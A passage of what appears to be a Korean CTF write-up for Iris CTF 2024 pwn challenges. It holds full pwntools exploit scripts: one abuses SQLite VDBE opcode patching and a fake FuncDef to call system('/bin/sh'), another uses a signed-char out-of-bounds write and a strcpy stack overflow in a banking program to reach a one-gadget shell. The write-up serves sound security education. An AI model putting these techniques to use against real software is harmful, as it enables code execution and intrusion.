일부러 SELECT 하고 서브 쿼리를 많이 추가해서 nOps를 늘린 상태에서 opcode를 수정했다.

### Code Execution
Code execution전에 먼저 memory에 연속적으로 원하는 데이터를 쓸 수 있어야한다.
sqlite3의 blob 데이터 타입을 이용하면 heap 영역에 연속적으로 데이터를 쓸 수 있다.

위 primitive를 이용해서 객체의 주소를 변조하고 그 객체의 virtual function call을 가로채는 방법이 충분히 가능할 것이라고 생각했다.
![](/blog/Iris_CTF_2024/4c13312725e9b4bea13e24821d31e71c.png)
모든 Opcode를 살펴봤지만, vfcall(controllable_rdi)의 꼴인 함수 호출이 존재하지 않았다.
one gadget을 사용하지 않고 좀 더 안정적인 익스플로잇을 위해서 구조체 변조가 쉽고 가능한 많은 인자가 컨트롤 가능한 Opcode를 찾았다.
![](/blog/Iris_CTF_2024/a8c22933bee2f8898b000b36116a0342.png)
```c
case OP_PureFunc:              /* group */
case OP_Function: {            /* group */
  int i;
  sqlite3_context *pCtx;

  assert( pOp->p4type==P4_FUNCCTX );
  pCtx = pOp->p4.pCtx;

  /* If this function is inside of a trigger, the register array in aMem[]
  ** might change from one evaluation to the next.  The next block of code
  ** checks to see if the register array has changed, and if so it
  ** reinitializes the relevant parts of the sqlite3_context object */
  pOut = &aMem[pOp->p3];
  if( pCtx->pOut != pOut ){
    pCtx->pVdbe = p;
    pCtx->pOut = pOut;
    pCtx->enc = encoding;
    for(i=pCtx->argc-1; i>=0; i--) pCtx->argv[i] = &aMem[pOp->p2+i];
  }
  assert( pCtx->pVdbe==p );

  memAboutToChange(p, pOut);
#ifdef SQLITE_DEBUG
  for(i=0; i<pCtx->argc; i++){
    assert( memIsValid(pCtx->argv[i]) );
    REGISTER_TRACE(pOp->p2+i, pCtx->argv[i]);
  }
#endif
  MemSetTypeFlag(pOut, MEM_Null);
  assert( pCtx->isError==0 );
  (*pCtx->pFunc->xSFunc)(pCtx, pCtx->argc, pCtx->argv);/* IMP: R-24505-23230 */

  /* If the function returned an error, throw an exception */
  if( pCtx->isError ){
    if( pCtx->isError>0 ){
      sqlite3VdbeError(p, "%s", sqlite3_value_text(pOut));
      rc = pCtx->isError;
    }
    sqlite3VdbeDeleteAuxData(db, &p->pAuxData, pCtx->iOp, pOp->p1);
    pCtx->isError = 0;
    if( rc ) goto abort_due_to_error;
  }

  assert( (pOut->flags&MEM_Str)==0
       || pOut->enc==encoding
       || db->mallocFailed );
  assert( !sqlite3VdbeMemTooBig(pOut) );

  REGISTER_TRACE(pOp->p3, pOut);
  UPDATE_MAX_BLOBSIZE(pOut);
  break;
}
```
조건도 heap base를 알고 있으므로 아주 쉽게 우회가 가능하다.

```c
struct sqlite3_context {
  Mem *pOut;              /* The return value is stored here */
  FuncDef *pFunc;         /* Pointer to function information */
  Mem *pMem;              /* Memory cell used to store aggregate context */
  Vdbe *pVdbe;            /* The VM that owns this context */
  int iOp;                /* Instruction number of OP_Function */
  int isError;            /* Error code returned by the function. */
  u8 enc;                 /* Encoding to use for results */
  u8 skipFlag;            /* Skip accumulator loading if true */
  u8 argc;                /* Number of arguments */
  sqlite3_value *argv[1]; /* Argument set */
};

struct FuncDef {
  i8 nArg;             /* Number of arguments.  -1 means unlimited */
  u32 funcFlags;       /* Some combination of SQLITE_FUNC_* */
  void *pUserData;     /* User data parameter */
  FuncDef *pNext;      /* Next function with same name */
  void (*xSFunc)(sqlite3_context*,int,sqlite3_value**); /* func or agg-step */
  void (*xFinalize)(sqlite3_context*);                  /* Agg finalizer */
  void (*xValue)(sqlite3_context*);                     /* Current agg value */
  void (*xInverse)(sqlite3_context*,int,sqlite3_value**); /* inverse agg-step */
  const char *zName;   /* SQL name of the function. */
  union {
    FuncDef *pHash;      /* Next with a different name but the same hash */
    FuncDestructor *pDestructor;   /* Reference counted destructor function */
  } u; /* pHash if SQLITE_FUNC_BUILTIN, pDestructor otherwise */
};
```
system("/bin/sh")를 호출하기 위해서는 한번의 code reuse가 필요하다.
![](/blog/Iris_CTF_2024/982080be44d41031a8a5a18e65d1bdee.png)
호출시에 rdi == rax이고 rdi는 현재 객체이다.
그래서 다음과 같은 가젯을 이용한다.
```c
0x000000000009097f : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x360]
```
위 가젯을 이용해서 자기 자신 객체를 다시 참조해서 rdi를 수정하고 호출한다.
```python
# sqlite3_context
payload = b'' # scopy 0x18
payload += p64(mem_start + 0x0) # Mem * pOut <- Mem[0] address, p3 must be 0
payload += p64(payload_start+0x38) # FuncDef *pFunc
payload += p64(payload_start + 0x18) # /bin/sh
payload += b'/bin/sh\x00'
payload += p32(0) * 2
payload += p8(0) * 2
payload += p8(1) + p8(0) * 5 # argc = 1
payload += p64(0) # argv *
# FuncDef
payload += p64(0) *3 
payload += p64(libc_base + 0x000000000009097f) 
payload += b'\x00' * (0x360 - len(payload))
payload += p64(libc_base + libc.sym.system-0x46e) # do_system + 2
```
### Exploit script
```python
OP_Savepoint     =  0#
OP_AutoCommit    =  1#
OP_Transaction   =  2#
OP_Checkpoint    =  3#
OP_JournalMode   =  4#
OP_Vacuum        =  5#
OP_VFilter       =  6# /* jump, synopsis: iplan=r[P3] zplan='P4'     */
OP_VUpdate       =  7# /* synopsis: data=r[P3@P2]                    */
OP_Init          =  8# /* jump, synopsis: Start at P2                */
OP_Goto          =  9# /* jump                                       */
OP_Gosub         = 10# /* jump                                       */
OP_InitCoroutine = 11# /* jump                                       */
OP_Yield         = 12# /* jump                                       */
OP_MustBeInt     = 13# /* jump                                       */
OP_Jump          = 14# /* jump                                       */
OP_Once          = 15# /* jump                                       */
OP_If            = 16# /* jump                                       */
OP_IfNot         = 17# /* jump                                       */
OP_IsType        = 18# /* jump, synopsis: if typeof(P1.P3) in P5 goto P2 */
OP_Not           = 19# /* same as TK_NOT, synopsis: r[P2]= !r[P1]    */
OP_IfNullRow     = 20# /* jump, synopsis: if P1.nullRow then r[P3]=NULL, goto P2 */
OP_SeekLT        = 21# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekLE        = 22# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekGE        = 23# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekGT        = 24# /* jump, synopsis: key=r[P3@P4]               */
OP_IfNotOpen     = 25# /* jump, synopsis: if( !csr[P1] ) goto P2     */
OP_IfNoHope      = 26# /* jump, synopsis: key=r[P3@P4]               */
OP_NoConflict    = 27# /* jump, synopsis: key=r[P3@P4]               */
OP_NotFound      = 28# /* jump, synopsis: key=r[P3@P4]               */
OP_Found         = 29# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekRowid     = 30# /* jump, synopsis: intkey=r[P3]               */
OP_NotExists     = 31# /* jump, synopsis: intkey=r[P3]               */
OP_Last          = 32# /* jump                                       */
OP_IfSmaller     = 33# /* jump                                       */
OP_SorterSort    = 34# /* jump                                       */
OP_Sort          = 35# /* jump                                       */
OP_Rewind        = 36# /* jump                                       */
OP_SorterNext    = 37# /* jump                                       */
OP_Prev          = 38# /* jump                                       */
OP_Next          = 39# /* jump                                       */
OP_IdxLE         = 40# /* jump, synopsis: key=r[P3@P4]               */
OP_IdxGT         = 41# /* jump, synopsis: key=r[P3@P4]               */
OP_IdxLT         = 42# /* jump, synopsis: key=r[P3@P4]               */
OP_Or            = 43# /* same as TK_OR, synopsis: r[P3]=(r[P1] || r[P2]) */
OP_And           = 44# /* same as TK_AND, synopsis: r[P3]=(r[P1] && r[P2]) */
OP_IdxGE         = 45# /* jump, synopsis: key=r[P3@P4]               */
OP_RowSetRead    = 46# /* jump, synopsis: r[P3]=rowset(P1)           */
OP_RowSetTest    = 47# /* jump, synopsis: if r[P3] in rowset(P1) goto P2 */
OP_Program       = 48# /* jump                                       */
OP_FkIfZero      = 49# /* jump, synopsis: if fkctr[P1]==0 goto P2    */
OP_IsNull        = 50# /* jump, same as TK_ISNULL, synopsis: if r[P1]==NULL goto P2 */
OP_NotNull       = 51# /* jump, same as TK_NOTNULL, synopsis: if r[P1]!=NULL goto P2 */
OP_Ne            = 52# /* jump, same as TK_NE, synopsis: IF r[P3]!=r[P1] */
OP_Eq            = 53# /* jump, same as TK_EQ, synopsis: IF r[P3]==r[P1] */
OP_Gt            = 54# /* jump, same as TK_GT, synopsis: IF r[P3]>r[P1] */
OP_Le            = 55# /* jump, same as TK_LE, synopsis: IF r[P3]<=r[P1] */
OP_Lt            = 56# /* jump, same as TK_LT, synopsis: IF r[P3]<r[P1] */
OP_Ge            = 57# /* jump, same as TK_GE, synopsis: IF r[P3]>=r[P1] */
OP_ElseEq        = 58# /* jump, same as TK_ESCAPE                    */
OP_IfPos         = 59# /* jump, synopsis: if r[P1]>0 then r[P1]-=P3, goto P2 */
OP_IfNotZero     = 60# /* jump, synopsis: if r[P1]!=0 then r[P1]--, goto P2 */
OP_DecrJumpZero  = 61# /* jump, synopsis: if (--r[P1])==0 goto P2    */
OP_IncrVacuum    = 62# /* jump                                       */
OP_VNext         = 63# /* jump                                       */
OP_Filter        = 64# /* jump, synopsis: if key(P3@P4) not in filter(P1) goto P2 */
OP_PureFunc      = 65# /* synopsis: r[P3]=func(r[P2@NP])             */
OP_Function      = 66# /* synopsis: r[P3]=func(r[P2@NP])             */
OP_Return        = 67#
OP_EndCoroutine  = 68#
OP_HaltIfNull    = 69# /* synopsis: if r[P3]=null halt               */
OP_Halt          = 70#
OP_Integer       = 71# /* synopsis: r[P2]=P1                         */
OP_Int64         = 72# /* synopsis: r[P2]=P4                         */
OP_String        = 73# /* synopsis: r[P2]='P4' (len=P1)              */
OP_BeginSubrtn   = 74# /* synopsis: r[P2]=NULL                       */
OP_Null          = 75# /* synopsis: r[P2..P3]=NULL                   */
OP_SoftNull      = 76# /* synopsis: r[P1]=NULL                       */
OP_Blob          = 77# /* synopsis: r[P2]=P4 (len=P1)                */
OP_Variable      = 78# /* synopsis: r[P2]=parameter(P1,P4)           */
OP_Move          = 79# /* synopsis: r[P2@P3]=r[P1@P3]                */
OP_Copy          = 80# /* synopsis: r[P2@P3+1]=r[P1@P3+1]            */
OP_SCopy         = 81# /* synopsis: r[P2]=r[P1]                      */
OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]                      */
OP_FkCheck       = 83#
OP_ResultRow     = 84# /* synopsis: output=r[P1@P2]                  */
OP_CollSeq       = 85#
OP_AddImm        = 86# /* synopsis: r[P1]=r[P1]+P2                   */
OP_RealAffinity  = 87#
OP_Cast          = 88# /* synopsis: affinity(r[P1])                  */
OP_Permutation   = 89#
OP_Compare       = 90# /* synopsis: r[P1@P3] <-> r[P2@P3]            */
OP_IsTrue        = 91# /* synopsis: r[P2] = coalesce(r[P1]==TRUE,P3) ^ P4 */
OP_ZeroOrNull    = 92# /* synopsis: r[P2] = 0 OR NULL                */
OP_Offset        = 93# /* synopsis: r[P3] = sqlite_offset(P1)        */
OP_Column        = 94# /* synopsis: r[P3]=PX cursor P1 column P2     */
OP_TypeCheck     = 95# /* synopsis: typecheck(r[P1@P2])              */
OP_Affinity      = 96# /* synopsis: affinity(r[P1@P2])               */
OP_MakeRecord    = 97# /* synopsis: r[P3]=mkrec(r[P1@P2])            */
OP_Count         = 98# /* synopsis: r[P2]=count()                    */
OP_ReadCookie    = 99#
OP_SetCookie     =100#
OP_ReopenIdx     =101# /* synopsis: root=P2 iDb=P3                   */
OP_BitAnd        =102# /* same as TK_BITAND, synopsis: r[P3]=r[P1]&r[P2] */
OP_BitOr         =103# /* same as TK_BITOR, synopsis: r[P3]=r[P1]|r[P2] */
OP_ShiftLeft     =104# /* same as TK_LSHIFT, synopsis: r[P3]=r[P2]<<r[P1] */
OP_ShiftRight    =105# /* same as TK_RSHIFT, synopsis: r[P3]=r[P2]>>r[P1] */
OP_Add           =106# /* same as TK_PLUS, synopsis: r[P3]=r[P1]+r[P2] */
OP_Subtract      =107# /* same as TK_MINUS, synopsis: r[P3]=r[P2]-r[P1] */
OP_Multiply      =108# /* same as TK_STAR, synopsis: r[P3]=r[P1]*r[P2] */
OP_Divide        =109# /* same as TK_SLASH, synopsis: r[P3]=r[P2]/r[P1] */
OP_Remainder     =110# /* same as TK_REM, synopsis: r[P3]=r[P2]%r[P1] */
OP_Concat        =111# /* same as TK_CONCAT, synopsis: r[P3]=r[P2]+r[P1] */
OP_OpenRead      =112# /* synopsis: root=P2 iDb=P3                   */
OP_OpenWrite     =113# /* synopsis: root=P2 iDb=P3                   */
OP_BitNot        =114# /* same as TK_BITNOT, synopsis: r[P2]= ~r[P1] */
OP_OpenDup       =115#
OP_OpenAutoindex =116# /* synopsis: nColumn=P2                       */
OP_String8       =117# /* same as TK_STRING, synopsis: r[P2]='P4'    */
OP_OpenEphemeral =118# /* synopsis: nColumn=P2                       */
OP_SorterOpen    =119#
OP_SequenceTest  =120# /* synopsis: if( cursor[P1].ctr++ ) pc = P2   */
OP_OpenPseudo    =121# /* synopsis: P3 columns in r[P2]              */
OP_Close         =122#
OP_ColumnsUsed   =123#
OP_SeekScan      =124# /* synopsis: Scan-ahead up to P1 rows         */
OP_SeekHit       =125# /* synopsis: set P2<=seekHit<=P3              */
OP_Sequence      =126# /* synopsis: r[P2]=cursor[P1].ctr++           */
OP_NewRowid      =127# /* synopsis: r[P2]=rowid                      */
OP_Insert        =128# /* synopsis: intkey=r[P3] data=r[P2]          */
OP_RowCell       =129#
OP_Delete        =130#
OP_ResetCount    =131#
OP_SorterCompare =132# /* synopsis: if key(P1)!=trim(r[P3],P4) goto P2 */
OP_SorterData    =133# /* synopsis: r[P2]=data                       */
OP_RowData       =134# /* synopsis: r[P2]=data                       */
OP_Rowid         =135# /* synopsis: r[P2]=PX rowid of P1             */
OP_NullRow       =136#
OP_SeekEnd       =137#
OP_IdxInsert     =138# /* synopsis: key=r[P2]                        */
OP_SorterInsert  =139# /* synopsis: key=r[P2]                        */
OP_IdxDelete     =140# /* synopsis: key=r[P2@P3]                     */
OP_DeferredSeek  =141# /* synopsis: Move P3 to P1.rowid if needed    */
OP_IdxRowid      =142# /* synopsis: r[P2]=rowid                      */
OP_FinishSeek    =143#
OP_Destroy       =144#
OP_Clear         =145#
OP_ResetSorter   =146#
OP_CreateBtree   =147# /* synopsis: r[P2]=root iDb=P1 flags=P3       */
OP_SqlExec       =148#
OP_ParseSchema   =149#
OP_LoadAnalysis  =150#
OP_DropTable     =151#
OP_DropIndex     =152#
OP_Real          =153# /* same as TK_FLOAT, synopsis: r[P2]=P4       */
OP_DropTrigger   =154#
OP_IntegrityCk   =155#
OP_RowSetAdd     =156# /* synopsis: rowset(P1)=r[P2]                 */
OP_Param         =157#
OP_FkCounter     =158# /* synopsis: fkctr[P1]+=P2                    */
OP_MemMax        =159# /* synopsis: r[P1]=max(r[P1],r[P2])           */
OP_OffsetLimit   =160# /* synopsis: if r[P1]>0 then r[P2]=r[P1]+max(0,r[P3]) else r[P2]=(-1) */
OP_AggInverse    =161# /* synopsis: accum=r[P3] inverse(r[P2@P5])    */
OP_AggStep       =162# /* synopsis: accum=r[P3] step(r[P2@P5])       */
OP_AggStep1      =163# /* synopsis: accum=r[P3] step(r[P2@P5])       */
OP_AggValue      =164# /* synopsis: r[P3]=value N=P2                 */
OP_AggFinal      =165# /* synopsis: accum=r[P1] N=P2                 */
OP_Expire        =166#
OP_CursorLock    =167#
OP_CursorUnlock  =168#
OP_TableLock     =169# /* synopsis: iDb=P1 root=P2 write=P3          */
OP_VBegin        =170#
OP_VCreate       =171#
OP_VDestroy      =172#
OP_VOpen         =173#
OP_VCheck        =174#
OP_VInitIn       =175# /* synopsis: r[P2]=ValueList(P1,P3)           */
OP_VColumn       =176# /* synopsis: r[P3]=vcolumn(P2)                */
OP_VRename       =177#
OP_Pagecount     =178#
OP_MaxPgcnt      =179#
OP_ClrSubtype    =180# /* synopsis: r[P1].subtype = 0                */
OP_FilterAdd     =181# /* synopsis: filter(P1) += key(P3@P4)         */
OP_Trace         =182#
OP_CursorHint    =183#
OP_ReleaseReg    =184# /* synopsis: release r[P1@P2] mask P3         */
OP_Noop          =185#
OP_Explain       =186#
OP_Abortable     =187#

OPFLG_JUMP       = 0x01#  /* jump:  P2 holds jmp target */
OPFLG_IN1        = 0x02#  /* in1:   P1 is an input */
OPFLG_IN2        = 0x04#  /* in2:   P2 is an input */
OPFLG_IN3        = 0x08#  /* in3:   P3 is an input */
OPFLG_OUT2       = 0x10#  /* out2:  P2 is an output */
OPFLG_OUT3       = 0x20#  /* out3:  P3 is an output */
OPFLG_NCYCLE     = 0x40#  /* ncycle:Cycles count against P1 */


from pwn import *
sla = lambda x,y : p.sendlineafter(x,y)
p = process('./chal')
e = ELF('./chal')
libc = e.libc
def prepare(idx, stmt):
  sla(b'Choice: ',str(1))
  sla(b'? ',str(idx))
  sla(b'line:',stmt)

def compile(opcode, p1 = 0, p2 = 0 , p3 = 0 ,p4 = 0 ,p4_type = 0, p5 = 0):
  payload = b''
  payload += p8(opcode)
  payload += p8(p4_type)
  payload += p16(p5)
  payload += p32(p1)
  payload += p32(p2)
  payload += p32(p3)
  payload += p64(p4)
  return payload

def modify_opcode(idx, vmcode):
  sla(b'Choice: ',str(5))
  sla(b'? ',str(idx))
  p.recvuntil(b'up to ')
  c = int(p.recvuntil(b')')[:-1],10)
  sla(b'? ',str(len(vmcode)))
  assert c%0x18 == 0
  p.send(vmcode)

def exec_q(idx):
  sla(b'Choice: ',str(2))
  sla(b'? ',str(idx))


payload = b'SELECT '
for i in range(0x20):
  payload += f'(SELECT {i}),'.encode()
payload = payload[:-1]
prepare(1,payload)
pc = 1
payload = compile(OP_Init, 0, pc) # jmp to pc
payload += compile(OP_Integer,0x1, 1)
payload += compile(OP_IntCopy, (-146)&0xffffffff, 1)
payload += compile(OP_ResultRow, 1, 1) # p2 = col count
payload += compile(OP_Halt)
modify_opcode(1, payload)
exec_q(1)

libc_base = int(p.recvuntil(b' ')[:-1]) - 0x21ace0
log.success(hex(libc_base))
'''
OP_SCopy         = 81# /* synopsis: r[P2]=r[P1]                      */
OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]                      */
'''

payload = compile(OP_Init, 0, pc) # jmp to pc
payload += compile(OP_Integer,0x1, 1)
payload += compile(OP_IntCopy, (-0xb8)&0xffffffff, 1)
payload += compile(OP_ResultRow, 1, 1) # p2 = col count
payload += compile(OP_Halt)
modify_opcode(1, payload)
exec_q(1)
heap_base = int(p.recvuntil(b' ')[:-1])-0x14578
log.success(hex(heap_base))

mem_start = heap_base + 0x16e28
payload_start = heap_base + 0x36b8

# sqlite3_context
payload = b'' # scopy 0x18
payload += p64(mem_start + 0x0) # Mem * pOut <- Mem[0] address, p3 must be 0
payload += p64(payload_start+0x38) # FuncDef *pFunc
payload += p64(payload_start + 0x18) # /bin/sh
payload += b'/bin/sh\x00'
payload += p32(0) * 2
payload += p8(0) * 2
payload += p8(1) + p8(0) * 5 # argc = 1
payload += p64(0) # argv *
# FuncDef
payload += p64(0) *3 
payload += p64(libc_base + 0x000000000009097f) 
payload += b'\x00' * (0x360 - len(payload))
payload += p64(libc_base + libc.sym.system-0x46e) # do_system + 2
# 0x000000000009097f : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x360]

hexp = ''
for i in payload:
  hexp += hex(i)[2:].rjust(2,'0')
prepare(2, f"SELECT x'{hexp}'".encode())

payload = compile(OP_Init, 0, pc) # jmp to pc
payload += compile(OP_PureFunc, p4 = payload_start, p3 = 0)
payload += compile(OP_Halt)
modify_opcode(1, payload)
pause()
exec_q(1)
p.interactive()
```

# Serious-banking
대회 기간에 풀었던 문제이다.
## Analysis
```cpp
#include <cstring>
#include <iostream>
#include <thread>
#include <cstdio>

struct Account {
    char id;
    bool active;
    char* name;
    uint64_t balance;
};

void submit_support_ticket(char* _name, char* _content) {
    // stub
}

char* separator;
char* debug_log;
Account* accounts;
char id_counter = 0;
size_t account_count = 0;

void interface() {
    while(true) {
        printf("Welcome to the ShakyVault Bank Interface\n");
        printf(separator);
        printf("1) Create new Account\n");
        printf("2) Show an Account\n");
        printf("3) Create a Transaction\n");
        printf("4) Deactivate an Account\n");
        printf("5) Create a support ticket\n");
        printf("6) Exit\n");
        printf("> ");

        const int selection = fgetc(stdin) - static_cast<int>('0');
        fgetc(stdin);

        switch (selection) {
            case 1: {
                if (account_count >= 255) {
                    printf("We've unfortunately run out of accounts. Please try again later.");
                    break;
                }

                printf("Account Name: ");

                char* account_name = new char[80];
                std::cin.getline(account_name, 80);
                for (size_t i = 0; i < 80; i++) {
                    if (account_name[i] == '\n') {
                        account_name[i] = '\0';
                        break;
                    }
                }
                account_name[79] = '\0';

                accounts[account_count].id = id_counter++;
                accounts[account_count].active = true;
                accounts[account_count].name = account_name;
                accounts[account_count].balance = 35;

                printf("Account created. Your id is %d\n", accounts[account_count++].id);
                printf("We have granted you a $35 starting bonus.\n");

                break;
            }
            case 2: {
                printf("Which id do you want to read? ");
                size_t number;
                std::cin >> number;
                if (std::cin.fail()) {
                    printf("Invalid Input.");
                    exit(EXIT_FAILURE);
                }
                fgetc(stdin);

                if (number >= account_count) {
                    printf("That account does not exist.");
                    break;
                }

                const Account acc = accounts[number];

                printf("Id: %d\n", acc.id);
                printf("Name: %s\n", acc.name);
                printf("Active: %s\n", acc.active ? "true" : "false");
                printf("Balance: %lu\n", acc.balance);

                break;
            }
            case 3: {
                printf("Which account do you want to transfer from? ");
                size_t id_from;
                std::cin >> id_from;
                if (std::cin.fail()) {
                    printf("Invalid Input.");
                    exit(EXIT_FAILURE);
                }
                fgetc(stdin);

                printf("Which account do you want to transfer to? ");
                size_t id_to;
                std::cin >> id_to;
                if (std::cin.fail()) {
                    printf("Invalid Input.");
                    exit(EXIT_FAILURE);
                }
                fgetc(stdin);

                if (id_from >= account_count || id_to >= account_count) {
                    printf("Invalid account id\n");
                    break;
                }

                printf("How much money do you want to transfer? ");
                uint64_t amount;
                std::cin >> amount;
                if (std::cin.fail()) {
                    printf("Invalid Input.");
                    exit(EXIT_FAILURE);
                }
                fgetc(stdin);

                const Account from = accounts[id_from];
                const Account to = accounts[id_to];

                if (from.balance < amount) {
                    printf("You don't have enough money for that.");
                    break;
                }

                if (!from.active || !to.active) {
                    printf("That account is not active.");
                    break;
                }

                accounts[from.id].balance -= amount;
                accounts[to.id].balance += amount;

                printf("Transaction created!\n");

                break;
            }
            case 4: {
                printf("Which account do you want to disable? ");
                size_t number;
                std::cin >> number;
                if (std::cin.fail()) {
                    printf("Invalid Input.");
                    exit(EXIT_FAILURE);
                }
                fgetc(stdin);

                if (number >= account_count) {
                    printf("That account does not exist.");
                    break;
                }

                accounts[number].active = false;
            }
            case 5: {
                printf("Which account does this issue concern? ");
                size_t number;
                std::cin >> number;
                if (std::cin.fail()) {
                    printf("Invalid Input.");
                    exit(EXIT_FAILURE);
                }
                fgetc(stdin);

                Account acc = accounts[number];

                char name[40] = "Support ticket from ";
                char* content = new char[1000];

                printf("Please describe your issue (1000 charaters): ");
                std::cin.getline(content, 1000);
                if (std::cin.fail()) {
                    printf("Invalid Input.");
                    exit(EXIT_FAILURE);
                }

                char* name_ptr = name + strlen(name);
                strcpy(name_ptr, acc.name);
                name_ptr += strlen(acc.name);
                *name_ptr = '\0';

                submit_support_ticket(name, content);
                printf("Thanks! Our support technicians will help you shortly.\n");

                delete[] content;

                break;
            }
            case 6: {
                return;
            }
            default: {
                printf("Invalid option %d\n\n\n", selection);
                break;
            }
        }
    }
}

int main() {
    setbuf(stdout, nullptr);

    separator = new char[128];
    debug_log = new char[2900];
    accounts = new Account[256];

    strcpy(debug_log, "TODO");

    for (int i = 0; i < 126; i++) separator[i] = '_';
    separator[126] = '\n';
    separator[127] = '\0';

    interface();

    delete[] separator;
    delete[] debug_log;
    delete[] accounts;

    return 0;
}

```

## Exploit
Create Transaction이 실행될때 두번의 참조가 일어나게 된다.
id는 char이므로 sign extension이 일어나서 oob write가 가능하다.
```cpp
    accounts[from.id].balance -= amount;
    accounts[to.id].balance += amount;
```
그리고 아래에서 stack bof가 터진다.
```cpp
	char* name_ptr = name + strlen(name);
    strcpy(name_ptr, acc.name);
    name_ptr += strlen(acc.name);
    *name_ptr = '\0';
```
### Exploit script

```python
from pwn import *
from tqdm import tqdm
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
# p = process('./vuln')
p = remote('serious-banking.chal.irisc.tf',10001)
# p = remote('localhost',1024)
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./bc.so.6')
# context.log_level='debug'
for i in tqdm(range(134)):
    sla(b'>',b'1')
    sla(b'Name',b'A'*(0x4c-8-1))

def transfer(fr,to,amount):
    assert amount >0
    sla(b'>',b'3')
    sla(b'from',str(fr))
    sla(b'to',str(to))
    sla(b'transfer? ',str(amount))
for i in tqdm(range(0x34)):
    transfer(128,0,35)
transfer(128,0,30)

for i in tqdm(range(0x34)):
    transfer(129,0,35)
transfer(129,0,30)

for i in tqdm(range(123)):
    transfer(i,130,35)
context.log_level='debug'
transfer(130,0,11)


# 0x5f5f5f -> 0x7025 -> %p
p.recvuntil(b'0x')
libc_base = int(b'0x'+p.recvuntil(b'_')[:-1],16) - libc.sym.write -20
success(hex(libc_base))
context.log_level='debug'
sla(b'>',b'1')
# 0xe5306 , 0x4497f , 0x449d3
payload = b'A'*(0x44)+p64(libc_base+0xe5306)
print(payload)
sla(b'Name',payload)

sla(b'>',b'5') 
sla(b'? ',b'134')
sla(b': ',b'asdf')

sla(b'>',b'6') 

# OoB Add/Sub
# Stack Bof
# OoB copy

# Heap OoB Add/Sub 

p.interactive()
```
